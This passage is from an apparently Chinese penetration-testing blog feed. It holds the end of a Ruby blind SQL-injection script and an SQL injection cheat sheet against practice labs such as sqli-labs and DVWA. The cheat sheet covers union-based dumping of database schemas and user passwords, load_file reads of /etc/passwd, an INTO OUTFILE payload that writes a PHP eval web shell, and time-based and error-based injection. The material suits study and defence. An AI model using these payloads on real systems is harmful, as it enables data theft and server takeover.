class="hljs-params">(payload)</span></span></span><span class="line">    response = send(payload)</span><span class="line">    response.body.<span class="hljs-keyword">include</span>?(Key)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">length_payload</span><span class="hljs-params">(payload, len)</span></span></span><span class="line">    format(LengthPayload, payload, len)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_length</span><span class="hljs-params">(payload, str=<span class="hljs-literal">nil</span>)</span></span></span><span class="line">    length_left = <span class="hljs-number">0</span></span><span class="line">    length_right = <span class="hljs-number">0</span></span><span class="line"></br></span><span class="line">    guess = <span class="hljs-number">5</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 首先确定可能的最长长度和最短长度</span></span><span class="line">    loop <span class="hljs-keyword">do</span></span><span class="line">      <span class="hljs-keyword">if</span> get_result( length_payload(payload, length_right) )</span><span class="line">        length_right += guess</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        length_left   = length_right - guess</span><span class="line">        <span class="hljs-keyword">break</span></span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 当没有内容的时候返回错误</span></span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">if</span> length_right.zero?</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># 精确判断长度</span></span><span class="line">    <span class="hljs-keyword">while</span> length_left &lt; (length_right - <span class="hljs-number">1</span>)</span><span class="line">      mid = (length_left + length_right) / <span class="hljs-number">2</span></span><span class="line"></br></span><span class="line">      <span class="hljs-comment"># 判断中间长度是否为真</span></span><span class="line">      <span class="hljs-keyword">if</span> get_result( length_payload(payload, mid) )</span><span class="line">        length_left = mid</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        length_right = mid</span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> length_right</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_name</span><span class="hljs-params">(payload, len)</span></span></span><span class="line">    name = <span class="hljs-string">&quot;&quot;</span></span><span class="line"></br></span><span class="line">    len.times <span class="hljs-keyword">do</span> <span class="hljs-params">|n|</span></span><span class="line">      n += <span class="hljs-number">1</span></span><span class="line">      ascii = get_name_char( payload, n )</span><span class="line">      name &lt;&lt; ascii.chr</span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> name</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name_payload</span><span class="hljs-params">(payload, pos, test)</span></span></span><span class="line">    format(SubstrPayload, payload, pos, test)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_name_char</span><span class="hljs-params">(payload, pos)</span></span></span><span class="line">    left  = <span class="hljs-number">0</span></span><span class="line">    right = <span class="hljs-number">0</span></span><span class="line"></br></span><span class="line">    guess = <span class="hljs-number">10</span></span><span class="line"></br></span><span class="line">    loop <span class="hljs-keyword">do</span></span><span class="line">      <span class="hljs-keyword">if</span> get_result( name_payload(payload, pos, right) )</span><span class="line">        right += guess</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        left = right - guess</span><span class="line">        <span class="hljs-keyword">break</span></span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">while</span> left &lt; (right - <span class="hljs-number">1</span>)</span><span class="line">      mid = (left + right) / <span class="hljs-number">2</span></span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">if</span> get_result( name_payload(payload, pos, mid) )</span><span class="line">        left = mid</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">else</span></span><span class="line">        right = mid</span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> right</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">inject = Inject.new</span><span class="line">inject.inject</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 脚本收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql 注入</title>
      <link href="/2021/12/31/sql-%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/12/31/sql-%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="文章收集"><a href="#文章收集" class="headerlink" title="文章收集"></a>文章收集</h2><ul><li><a href="https://www.bugbank.cn/q/article/58afc3c06ef394d12a8a4379.html">bugbank上汇总</a></li><li><a href="http://www.aneasystone.com/archives/2014/09/all-input-is-evil-sql-injection.html">所有用户的输入都是邪恶的</a></li><li><a href="https://blog.csdn.net/chengxuyuanyonghu/article/details/40078181">information_schema表</a></li><li><a href="https://segmentfault.com/a/1190000007520556">Sql注入详解</a></li><li><a href="https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html">Sql注入（数字型）</a></li><li><a href="https://blog.spoock.com/2016/06/28/sql-injection-1/">SQL注入必备知识</a> 这里面涵盖了基本所有应该知道的信息，在文章里查不到的来这里查</li><li><a href="https://www.jianshu.com/p/399881e79b1f">联合查询</a></li></ul><h2 id="基本show命令"><a href="#基本show命令" class="headerlink" title="基本show命令"></a>基本show命令</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">show</span> tables或<span class="hljs-keyword">show</span> tables <span class="hljs-keyword">from</span> database_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示当前数据库中所有表的名称</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> databases; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示mysql中所有数据库的名称</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">from</span> database_name; </span><span class="line">或MySQL <span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> database_name.table_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示表中列名称</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> user_name<span class="hljs-variable">@localhost</span>; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示一个用户的权限，显示结果类似于<span class="hljs-keyword">grant</span> 命令</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> index <span class="hljs-keyword">from</span> table_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示表的索引</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> status; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示一些系统特定资源的信息，例如，正在运行的线程数量</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> variables; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示系统变量的名称和值</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> processlist; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看</span><span class="line"></br></span><span class="line">他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。</span><span class="line"></br></span><span class="line">MySQL <span class="hljs-keyword">show</span> <span class="hljs-keyword">table</span> status; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>更新时间</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> privileges; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示服务器所支持的不同权限</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> database database_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示<span class="hljs-keyword">create</span> database 语句是否能够创建指定的数据库</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> table_name; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示<span class="hljs-keyword">create</span> database 语句是否能够创建指定的数据库</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> engies; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示安装以后可用的存储引擎和默认引擎。</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> innodb status; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示innoDB存储引擎的状态</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> logs; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示BDB存储引擎的日志</span><span class="line"></br></span><span class="line">MySQL <span class="hljs-keyword">show</span> warnings; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 显示<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>一个执行的语句所产生的错误、警告和通知</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">show</span> errors; <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 只显示<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>一个执行语句所产生的错误</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> count(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>;</span></code></pre></div></div><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"># 判断列表长度</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span></span><span class="line"></br></span><span class="line"># 确定回显的列</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span></span><span class="line"></br></span><span class="line"># 收集基本信息</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,database(), <span class="hljs-keyword">user</span>(), version(), @<span class="hljs-variable">@basedir</span>), <span class="hljs-number">3</span></span><span class="line"></br></span><span class="line"># 找不同的数据库表个数</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> table_schema), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables</span><span class="line"></br></span><span class="line"># 列出不同的数据库表</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">distinct</span> table_schema), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables</span><span class="line"></br></span><span class="line"># 通过数据库名，查询表名</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span></span><span class="line"></br></span><span class="line"># 通过数据库名和表名，查询列名</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;info&#x27;</span></span><span class="line"></br></span><span class="line"># 通过查到的表名和列名，查询数据</span><span class="line"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flAg_T5ZNdrm), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> sqli.info</span></code></pre></div></div><h2 id="重要信息收集"><a href="#重要信息收集" class="headerlink" title="重要信息收集"></a>重要信息收集</h2><h3 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> information_schema.schema;</span></code></pre></div></div><h3 id="表信息"><a href="#表信息" class="headerlink" title="表信息"></a>表信息</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span>;</span></code></pre></div></div><h3 id="字段信息"><a href="#字段信息" class="headerlink" title="字段信息"></a>字段信息</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">and</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;users&#x27;</span>;</span></code></pre></div></div><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">?id=-<span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select 1,load_file(&#x27;</span><span class="hljs-regexp">/etc/</span>passwd<span class="hljs-string">&#x27;)</span></span></code></pre></div></div><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><h4 id="测试风暴"><a href="#测试风暴" class="headerlink" title="测试风暴"></a>测试风暴</h4><p><code>单引号</code> <code>双引号</code> <code>带括号</code> <code>时间逻辑</code></p><h4 id="39-提交大法"><a href="#39-提交大法" class="headerlink" title="&#39;提交大法"></a><code>&#39;</code>提交大法</h4><p>判断是否可能为注入点的方法:<br><code>1&#39;</code> 报错，而<code>1&#39;&#39;</code>没有报错。<br>判断的依据是看后台有没有过滤这些，把这些当成一个整体来输入。</p><h4 id="or-and-大法"><a href="#or-and-大法" class="headerlink" title="or and 大法"></a><code>or</code> <code>and</code> 大法</h4><h4 id="加减大法"><a href="#加减大法" class="headerlink" title="加减大法"></a>加减大法</h4><p>判断是数字型还是字符型</p><h3 id="数据库权限判断"><a href="#数据库权限判断" class="headerlink" title="数据库权限判断"></a>数据库权限判断</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> ord(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">=</span> <span class="hljs-number">114</span>;  <span class="hljs-operator">/</span><span class="hljs-operator">/</span> root权限</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> mysql.user;  <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 读写权限</span></code></pre></div></div><h3 id="判断字段的个数"><a href="#判断字段的个数" class="headerlink" title="判断字段的个数"></a>判断字段的个数</h3><ol><li>使用 <code>order by 1 +--+</code> 往上加。直到出错。可以快速判断出总共有多少个字段。</li><li>使用<code>union select 1,2,3,4</code> 判断哪几个字段是用户可以回显的。<ul><li>注意一开始可以使用<code>null</code>来判断多少个回显，因为有可能不让用数字型</li></ul></li></ol><h4 id="用UNION-SELECT获取关键数据"><a href="#用UNION-SELECT获取关键数据" class="headerlink" title="用UNION SELECT获取关键数据"></a>用<code>UNION SELECT</code>获取关键数据</h4><ul><li><code>&#39;union select user(),database() +--+</code></li><li><code>&#39;union select session_user(),current_user(),version() +--+</code></li><li><code>&#39;union select load_file(&#39;/etc/passwd&#39;),2,3,4,5,6,7,version() limit 1</code> </li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-csharp codeBlockLines"><span class="line">?id=<span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> TABLE_SCHEMA, TABLE_NAME <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;dvwa&#x27;</span></span></code></pre></div></div><h3 id="破解字段"><a href="#破解字段" class="headerlink" title="破解字段"></a>破解字段</h3><h4 id="字典爆破流"><a href="#字典爆破流" class="headerlink" title="字典爆破流"></a>字典爆破流</h4><p><code>and exists(select * from ?)     //?为猜测的表名</code></p><h4 id="截取二分流"><a href="#截取二分流" class="headerlink" title="截取二分流"></a>截取二分流</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">and</span> (length((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span>?)       <span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断数据库名的长度， 特别注意length(()),是两个括号</span><span class="line"><span class="hljs-keyword">and</span> (substr((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;?&#x27;</span>)</span><span class="line"><span class="hljs-keyword">and</span> (substr((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">&lt;</span><span class="hljs-string">&#x27;?&#x27;</span>)      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>利用二分法判断第一个字符</span></code></pre></div></div><p>判断下一个字段:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-n1ql codeBlockLines"><span class="line">id=1&#x27; and length((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME != <span class="hljs-string">&#x27;guestbook&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>))&gt;<span class="hljs-number">5</span></span></code></pre></div></div><h3 id="查数据库版本"><a href="#查数据库版本" class="headerlink" title="查数据库版本"></a>查数据库版本</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">select</span> ord(mid(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">51</span>;</span></code></pre></div></div><p>ASCII 51 -&gt; 3;<br>大于3的版本, 4或者5 才可以使用<code>union</code><br>而有的可能使用的并不是mysql，而是<code>10.1.35-MariaDB</code>，所以此时的版本开头为<code>10</code></p><h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> ;</span></code></pre></div></div><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span>;</span></code></pre></div></div><p><em><code>group_concat</code>可以把多行串起来一起显示了</em></p><h3 id="查字段（列）"><a href="#查字段（列）" class="headerlink" title="查字段（列）"></a>查字段（列）</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span>;</span></code></pre></div></div><h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> group_concat(user_id,<span class="hljs-string">&#x27;-&#x27;</span>, first_name,<span class="hljs-string">&#x27;-&#x27;</span>, last_name, <span class="hljs-string">&#x27;-&#x27;</span>,password) <span class="hljs-keyword">from</span> users;</span></code></pre></div></div><p>或者</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>, password <span class="hljs-keyword">from</span> users;</span></code></pre></div></div><h2 id="注入技巧"><a href="#注入技巧" class="headerlink" title="注入技巧"></a>注入技巧</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>不同的数据库注释的方法都不一样</p><ul><li><code>#</code></li><li><code>--[空格]或者是--+</code></li></ul><h3 id="双注入"><a href="#双注入" class="headerlink" title="双注入"></a>双注入</h3><p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440">双注入详解</a></p><p>双注入通过报错的方式得到第一次select的信息。</p><blockquote><p>原理是当<code>count()</code>后面跟上<code>group by</code> 则会以报错的方式显示第一次查询的信息。</p></blockquote><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-number">3</span>, concat((<span class="hljs-keyword">select</span>(version())), <span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a</span></code></pre></div></div><p>注意一点: 需要把 <code>concat()</code>放到最后一个select才行。</p><p>还有一种派生表，模式是<code> select 1 from (table name)</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), <span class="hljs-number">2</span>, concat((<span class="hljs-keyword">select</span> version()), <span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a)x <span class="hljs-comment">-- &#x27; LIMIT 0,1</span></span></code></pre></div></div><h3 id="outfile"><a href="#outfile" class="headerlink" title="outfile()"></a><code>outfile()</code></h3><p>高版本的Mysql会有个<code>secure_file_priv</code>的选项不让导入导出文件</p><p>下面给一个例子</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">&lt;</span>?php <span class="hljs-variable">@eval</span>($_POST[&quot;giantbranch&quot;]);?<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27; into outfile &#x27;</span>E:\\wamp\\www\\sqli<span class="hljs-operator">-</span>labs\\muma.php<span class="hljs-string">&#x27; %23</span></span></code></pre></div></div><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><blockquote><p>重点是通过Boolean判断长度和名称。</p></blockquote><h4 id="单引号盲注"><a href="#单引号盲注" class="headerlink" title="单引号盲注"></a>单引号盲注</h4><p><a href="/2021/12/31/GET-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" title="GET 单引号盲注脚本">GET 单引号盲注脚本</a></p><h4 id="时间逻辑盲注"><a href="#时间逻辑盲注" class="headerlink" title="时间逻辑盲注"></a>时间逻辑盲注</h4><p>当成功和失败的输出是一样的时候，使用时间逻辑方法</p><blockquote><p>重点在于当查询<strong>成功</strong>的时候，延迟5秒 。</p></blockquote><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(ord(substr((<span class="hljs-keyword">select</span> database()), <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">97</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">0</span>);</span></code></pre></div></div><h2 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h2><ul><li><a href="https://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html">这里</a>是基于错误注入的总结</li></ul><h3 id="concat-rand-floor-导致的重复主键错误"><a href="#concat-rand-floor-导致的重复主键错误" class="headerlink" title="concat, rand, floor 导致的重复主键错误"></a>concat, rand, floor 导致的重复主键错误</h3><p>基本型：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> concat(<span class="hljs-keyword">user</span>(), floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x, count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> 